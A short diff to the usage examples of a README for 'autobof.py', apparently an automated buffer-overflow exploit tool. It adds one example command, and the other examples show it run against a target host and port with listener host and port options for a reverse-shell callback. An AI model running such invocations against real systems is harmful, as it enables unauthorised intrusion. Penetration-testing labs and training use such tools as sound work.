@@ -17,6 +17,7 @@
   ```
 ##### Examples:
   ```
+  kali@kali:~$ python3 autobof.py --rhost 10.10.1.41 --rport 1337
   kali@kali:~$ python3 autobof.py --rhost 10.10.1.41 --rport 12345 --prefix "hello" --lhost eth0
   kali@kali:~$ python3 autobof.py --rhost 10.10.1.41 --rport 777 --suffix " ending string!" --lport 4444
   kali@kali:~$ python3 autobof.py --rhost 10.10.1.41 --rport 930 --prefix "Username: " --suffix "end" --lhost 192.168.1.10 --lport 1234
